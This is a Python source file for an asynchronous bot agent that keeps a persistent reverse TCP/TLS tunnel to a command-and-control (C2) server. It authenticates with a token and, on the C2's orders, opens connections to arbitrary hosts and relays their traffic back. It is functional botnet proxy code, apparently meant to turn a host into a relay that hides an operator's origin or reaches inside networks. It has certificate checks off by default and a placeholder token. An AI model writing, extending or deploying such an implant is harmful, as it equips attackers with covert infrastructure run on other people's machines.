#!/usr/bin/env python3
"""
bot_agent.py

Async Bot agent:
- Persistent reverse TLS/TCP tunnel to C2
- Local HTTP/SOCKS5 proxy (optional)
- Multiplex multiple client connections over the tunnel
"""

import asyncio
import ssl
import logging
import uuid
import json
import os
import signal
import sys
from typing import Dict, Optional

# Add project root to Python path for direct execution
if __name__ == "__main__":
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from core.protocol import Frame, FramedStream, Heartbeat


logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("bot")


class BotAgent:
    def __init__(self, c2_host: str, c2_port: int, token: str, bot_id: Optional[str] = None,
                 cert_reqs: bool = False, config_file: Optional[str] = None):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.token = token
        self.bot_id = bot_id or f"bot-{uuid.uuid4()}"
        self.ssl_ctx: Optional[ssl.SSLContext] = None
        if cert_reqs:
            self.ssl_ctx = ssl.create_default_context()
        self.stream: Optional[FramedStream] = None
        self.heartbeat: Optional[Heartbeat] = None
        # request_id -> (reader, writer)
        self.active: Dict[str, asyncio.StreamWriter] = {}
        
        # Load config if provided
        self.config = self._load_config(config_file) if config_file else {}
        
        # Network settings from config or defaults
        self.buffer_size = self.config.get("network", {}).get("buffer_size", 4096)
        self.read_timeout = self.config.get("network", {}).get("read_timeout", 30)
        self.write_timeout = self.config.get("network", {}).get("write_timeout", 30)
        self.connect_timeout = self.config.get("network", {}).get("connect_timeout", 10)
        
        # Shutdown handling
        self._shutdown_event = asyncio.Event()
        self._tasks = []

    def _load_config(self, config_file: str) -> dict:
        """Load configuration from JSON file."""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                logger.info("Bot loaded config from %s", config_file)
                return config
            else:
                logger.warning("Bot config file %s not found", config_file)
                return {}
        except (json.JSONDecodeError, KeyError) as e:
            logger.error("Invalid bot config file %s: %s", config_file, e)
            return {}
        except Exception as e:
            logger.error("Error loading bot config %s: %s", config_file, e)
            return {}

    async def connect_loop(self):
        """Main connection loop with graceful shutdown support."""
        # Setup signal handlers
        self._setup_signal_handlers()
        
        logger.info("Starting bot agent %s, connecting to %s:%d", self.bot_id, self.c2_host, self.c2_port)
        logger.info("Press Ctrl+C to shutdown gracefully")
        
        try:
            while not self._shutdown_event.is_set():
                try:
                    reader, writer = await asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx)
                    self.stream = FramedStream(reader, writer)
                    await self.stream.send(Frame(type="AUTH", meta={"token": self.token, "bot_id": self.bot_id}))
                    ok = await self.stream.recv(timeout=10)
                    if not ok or ok.type != "OK":
                        logger.error("auth failed, retrying...")
                        await asyncio.sleep(3)
                        continue
                    # Use config values for heartbeat
                    heartbeat_interval = self.config.get("heartbeat", {}).get("interval", 30)
                    heartbeat_timeout = self.config.get("heartbeat", {}).get("timeout", 90)
                    self.heartbeat = Heartbeat(self.stream, interval=heartbeat_interval, timeout=heartbeat_timeout, name=f"bot-{self.bot_id}")
                    await self.heartbeat.start()
                    logger.info("Connected to C2 %s:%d as %s", self.c2_host, self.c2_port, self.bot_id)
                    
                    # Start main run loop
                    run_task = asyncio.create_task(self._run(), name=f"bot-run-{self.bot_id}")
                    self._tasks.append(run_task)
                    
                    # Wait for shutdown or connection error
                    try:
                        await asyncio.wait_for(self._shutdown_event.wait(), timeout=None)
                    except asyncio.CancelledError:
                        pass
                    
                    # Stop heartbeat and close connection
                    if self.heartbeat:
                        await self.heartbeat.stop()
                    self.stream.close()
                    break
                    
                except (ConnectionRefusedError, OSError, ssl.SSLError) as e:
                    if not self._shutdown_event.is_set():
                        logger.warning("connection failed: %s", e)
                        await asyncio.sleep(2)
                except asyncio.CancelledError:
                    logger.info("connection cancelled")
                    break
                except Exception as e:
                    if not self._shutdown_event.is_set():
                        logger.error("unexpected connection error: %s", e)
                        await asyncio.sleep(2)
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt")
        finally:
            await self._cleanup()

    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info("Received signal %d, initiating graceful shutdown...", signum)
            self._shutdown_event.set()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # On Windows, also handle SIGBREAK
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, signal_handler)

    async def _cleanup(self):
        """Cleanup resources during shutdown."""
        logger.info("Starting bot cleanup...")
        
        # Cancel all tasks
        for task in self._tasks:
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        
        # Stop heartbeat
        if self.heartbeat:
            await self.heartbeat.stop()
        
        # Close stream
        if self.stream:
            self.stream.close()
        
        # Close all active connections
        for req_id, writer in list(self.active.items()):
            try:
                writer.close()
            except Exception as e:
                logger.debug("Error closing connection %s: %s", req_id, e)
        
        self.active.clear()
        logger.info("Bot cleanup completed")

    async def _run(self):
        assert self.stream
        try:
            while not self._shutdown_event.is_set():
                try:
                    frame = await asyncio.wait_for(self.stream.recv(), timeout=1.0)
                    if frame is None:
                        raise ConnectionError("tunnel closed")
                    if await self.heartbeat.handle_rx(frame):
                        continue
                    if frame.type == "PROXY_REQUEST":
                        await self._handle_proxy_request(frame)
                    elif frame.type == "DATA":
                        await self._handle_data(frame)
                    elif frame.type == "END":
                        await self._handle_end(frame)
                    elif frame.type == "ERR":
                        logger.warning("C2 error: %s", frame.meta.get("reason", "unknown"))
                    else:
                        logger.debug("unhandled frame: %s", frame.type)
                except asyncio.TimeoutError:
                    # Check shutdown event periodically
                    continue
                except ConnectionError as e:
                    logger.warning("Connection error: %s", e)
                    break
                except Exception as e:
                    logger.error("Unexpected error in _run: %s", e)
                    break
        except asyncio.CancelledError:
            logger.info("Bot run loop cancelled")
            raise

    async def _handle_proxy_request(self, frame: Frame):
        req_id = frame.request_id or str(uuid.uuid4())
        host = frame.meta.get("host")
        port = int(frame.meta.get("port", 0))
        if not host or not port:
            return
        # Open upstream
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), 
                timeout=self.connect_timeout
            )
            self.active[req_id] = writer
            # Start pump upstream->C2
            asyncio.create_task(self._pump_upstream(reader, req_id), name=f"pump-upstream-{req_id}")
        except (ConnectionRefusedError, OSError, asyncio.TimeoutError) as e:
            logger.warning("upstream connect failed %s:%s: %s", host, port, e)
            if self.stream:
                await self.stream.send(Frame(type="ERR", request_id=req_id, meta={"reason": str(e)}))
        except Exception as e:
            logger.error("unexpected upstream connect error %s:%s: %s", host, port, e)
            if self.stream:
                await self.stream.send(Frame(type="ERR", request_id=req_id, meta={"reason": "internal error"}))

    async def _handle_data(self, frame: Frame):
        req_id = frame.request_id
        w = self.active.get(req_id)
        if w and frame.payload:
            try:
                w.write(frame.payload)
                await w.drain()
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.warning("upstream write error: %s", e)
            except Exception as e:
                logger.error("unexpected upstream write error: %s", e)

    async def _handle_end(self, frame: Frame):
        req_id = frame.request_id
        w = self.active.pop(req_id, None)
        if w:
            try:
                w.close()
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("upstream close error: %s", e)
            except Exception as e:
                logger.warning("unexpected upstream close error: %s", e)

    async def _pump_upstream(self, reader: asyncio.StreamReader, req_id: str):
        assert self.stream
        try:
            while True:
                chunk = await reader.read(self.buffer_size)
                if not chunk:
                    break
                await self.stream.send(Frame(type="PROXY_RESPONSE", request_id=req_id, payload=chunk))
        finally:
            await self.stream.send(Frame(type="END", request_id=req_id))


async def main():
    import argparse
    p = argparse.ArgumentParser(description="Bot Agent with config file support")
    p.add_argument("--c2-host", required=True, help="C2 server host")
    p.add_argument("--c2-port", type=int, required=True, help="C2 server port")
    p.add_argument("--token", default="changeme", help="Bot authentication token")
    p.add_argument("--bot-id", help="Bot ID (auto-generated if not provided)")
    p.add_argument("--config", help="Config file path")
    p.add_argument("--tls", action="store_true", help="Enable TLS connection")
    args = p.parse_args()

    bot = BotAgent(args.c2_host, args.c2_port, args.token, args.bot_id, 
                   cert_reqs=args.tls, config_file=args.config)
    await bot.connect_loop()


if __name__ == "__main__":
    asyncio.run(main())


